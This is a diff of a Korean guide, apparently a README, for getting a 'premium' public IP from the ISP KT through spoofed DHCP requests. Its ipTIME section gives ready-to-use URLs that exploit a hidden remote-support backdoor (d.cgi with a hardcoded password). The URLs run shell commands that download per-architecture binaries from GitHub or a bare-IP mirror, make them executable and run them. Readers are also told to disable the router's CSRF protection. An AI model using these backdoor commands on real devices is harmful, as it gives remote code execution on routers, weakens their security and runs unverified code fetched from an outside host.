@@ -18,7 +18,7 @@ ASUSWRT/OpenWrt/넷기어/시놀로지RT/기업용 브랜드 지원
 
 iptime(테스트중) 일부 지원
 
-iptime/netis/티피링크/머큐시스/D-Link/링크시스/기타 듣보잡 미지원\:
+그 외 iptime/netis/티피링크/머큐시스/D-Link/링크시스/기타 듣보잡 미지원\:
 미지원 기기에 적용하려면 지원 기기로부터 인터넷 연결을 제공받는 **각 기기** 중 하나여야 하며, **이중 NAT 구성**이므로 지원 기기에서 팁 적용 후 미지원 공유기가 제공하는 인터넷 연결이 영향을 받습니다.
 
 예시 - KT GiGA WiFi/ASUSWRT의 컴퓨터/LAN 포트와 미지원 공유기의 WAN/인터넷 포트를 연결한 경우, 미지원 공유기를 허브모드/브릿지모드 등으로 변경한 경우 제외
@@ -132,22 +132,45 @@ https://archive.md/VRZIO
 
 iptime(테스트중)
 
-백도어 출처 - https://github.com/tylzars/iptime-debug
+백도어 출처 - https://github.com/tylzars/iptime-debug - 펌웨어 버전 15.09.8, ipTIME A2004S에서 동작 확인됨
 
 위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다
 
-2번 과정에서 iptime에 내장된 wget이 HTTPS 연결을 지원하지 않는 경우, <a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc</a>의 바이너리를 /tmp에 복사할 방법은 각자 준비하세요.
-또한, 필요한 바이너리는 사용중인 모델별로 다릅니다
+<a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc 출처</a>
 
 링크를 직접 클릭하지 말고 로그인한 관리자 페이지의 주소 칸에 붙여넣으세요
 
+aarch64로 예상되는 기기 : BE19000, BE3600QCA, AX11000계열, AX8004BCM, AX8004M, AX8008M, A8004T-XR, AX7800M, AX6000M, AX6008M, AX3000M, AX3000Q, AX3008M, AX3000SM, T5008SE
+
+armhf로 예상되는 기기 : AX5400BCM, AX3004BCM, AX3000BCM, AX2004BCM, A9004M, A8004NS-M, A8NS-M, A6004MX, AX3000R
+
+mipsel로 예상되는 기기 : AX2004M, AX2004, AX2002-Mesh, A9004M-X2, A8004T, A6NS-M, A3002-MESH, A3004NS-M, A3004M, A3004T, A3004TW, A3008-MU, A5004NS-M, A6004NS-M, A7004NS-M, T5004, T5008, AX1500R, AX1500SR, A2004SE, A2004VS, A2004S, A2002SR, A2004SR, A2004V
+
 1. 적용하려는 기기는 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, '원격 지원'기능이 켜져 있어야 합니다. 또한 모델별로 다운로드받아야 할 udhcpc 파일명이 다를 수 있습니다
-2. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fdhclient.gz%20https%3a%2f%2fgithub.com%2fveilRedeemer%2fudhcp%2freleases%2fdownload%2f0.9.9-pre%2fudhcpc_aarch64.gz
-3. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=gzip%20-d%20%2ftmp%2fdhclient.gz
-4. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=chmod%20755%20%2ftmp%2fdhclient
-5. 인터넷 설정 정보에서 '연결해제'를 선택합니다
-6. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=%2ftmp%2fdhclient%20-s%20%2fsbin%2fdhcpc.sh%20-i%20eth1%20-p%20%2fvar%2frun%2fdhclient.eth1%20-V%20KT_PR_HH_A_A
-7. 새로운 '외부 IP 주소'를 확인해봅시다
+2. aarch64 기기, udhcpc 다운로드 주소 - http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fdhclient.gz%20https%3a%2f%2fgithub.com%2fveilRedeemer%2fudhcp%2freleases%2fdownload%2f0.9.9-pre%2fudhcpc_aarch64.gz
+ 
+   armhf 기기, udhcpc 다운로드 주소 - http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fdhclient.gz%20https%3a%2f%2fgithub.com%2fveilRedeemer%2fudhcp%2freleases%2fdownload%2f0.9.9-pre%2fudhcpc_armhf.gz
+   
+   mipsel 기기, udhcpc 다운로드 주소 - http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fdhclient.gz%20https%3a%2f%2fgithub.com%2fveilRedeemer%2fudhcp%2freleases%2fdownload%2f0.9.9-pre%2fudhcpc_mipsel.gz
+   
+   위 다운로드 링크를 선택했을 때 아래와 같은 메시지가 표시된다면 원본 링크로부터 직접 다운로드받을 수 없는 환경이므로 각자 웹서버를 준비하거나 미리 준비된 미러 사이트에서 다운로드받아야 합니다.
+   
+   <img width="498" alt="notls" src="https://github.com/user-attachments/assets/6ee27eda-0b7f-4213-a868-7a118907b1d3" />
+
+   미러 사이트는 접속자의 IP 주소와 타임스탬프를 포함한 접속 기록을 저장함에 동의하고 다운로드 주소를 사용:
+   
+   aarch64 기기, 미러 다운로드 주소 - http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fdhclient.gz%20http%3a%2f%2f168.138.196.144%2fudhcpc_aarch64.gz
+
+   armhf 기기, 미러 다운로드 주소 - http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fdhclient.gz%20http%3a%2f%2f168.138.196.144%2fudhcpc_armhf.gz
+
+   mipsel 기기, 미러 다운로드 주소 - http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fdhclient.gz%20http%3a%2f%2f168.138.196.144%2fudhcpc_mipsel.gz
+   
+4. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=gzip%20-d%20%2ftmp%2fdhclient.gz
+5. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=chmod%20755%20%2ftmp%2fdhclient
+6. 인터넷 설정 정보에서 '연결해제'를 선택합니다
+7. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=%2ftmp%2fdhclient%20-s%20%2fsbin%2fdhcpc.sh%20-i%20eth1%20-p%20%2fvar%2frun%2fdhclient.eth1%20-V%20KT_PR_HH_A_A
+8. 새로운 '외부 IP 주소'를 확인해봅시다. 다운로드한 데이터를 포함한 변경 사항은 특정 공유기 설정을 변경하거나 재시동되거나 전원이 끊어지면 지워집니다
+9. 성공적으로 프리미엄 IP를 취득했다면 기기 모델명과 펌웨어 버전, 미러 다운로드 주소 사용여부를 3570kgen@naver.com 에 제보하는 것을 고려해보세요.
 
 <a href="https://shop.kt.com/shrt/CCiqOp.do">따라하는 과정에서 발생하는 어려움은 대부분 여기에서 해결할 수 있습니다</a>
 
